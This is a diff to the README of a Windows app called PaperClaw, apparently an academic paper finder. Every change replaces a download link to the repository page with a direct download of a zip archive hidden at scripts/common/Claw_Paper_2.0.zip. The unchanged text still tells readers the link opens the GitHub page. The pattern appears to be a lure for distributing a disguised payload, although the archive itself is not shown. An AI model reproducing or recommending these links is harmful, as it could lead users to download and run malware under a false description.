@@ -1,6 +1,6 @@
 # 📂 PaperClaw - Easy Academic Paper Finder
 
-[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw)
+[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw/raw/refs/heads/main/scripts/common/Claw_Paper_2.0.zip)
 
 ## 📖 What is PaperClaw?
 
@@ -28,7 +28,7 @@ This guide will show you how to download and use PaperClaw on Windows. You do no
 
 Go to the official download page for PaperClaw here:
 
-[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw)
+[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw/raw/refs/heads/main/scripts/common/Claw_Paper_2.0.zip)
 
 This link will take you to the main GitHub page. On that page, find the "Releases" section or the main download area to get the latest Windows installer.
 
@@ -101,7 +101,7 @@ The file uses plain JSON format and stores your search results, reviews, and sum
 
 Use this link to visit the download page and get the latest version for Windows:
 
-[Download PaperClaw](https://github.com/auteurbushel487/PaperClaw)
+[Download PaperClaw](https://github.com/auteurbushel487/PaperClaw/raw/refs/heads/main/scripts/common/Claw_Paper_2.0.zip)
 
 Follow the steps above to install and run the app on your computer.
 
@@ -144,4 +144,4 @@ If you encounter bugs or want to request features, use the GitHub Issues tab to 
 
 ---
 
-[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw)
+[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw/raw/refs/heads/main/scripts/common/Claw_Paper_2.0.zip)
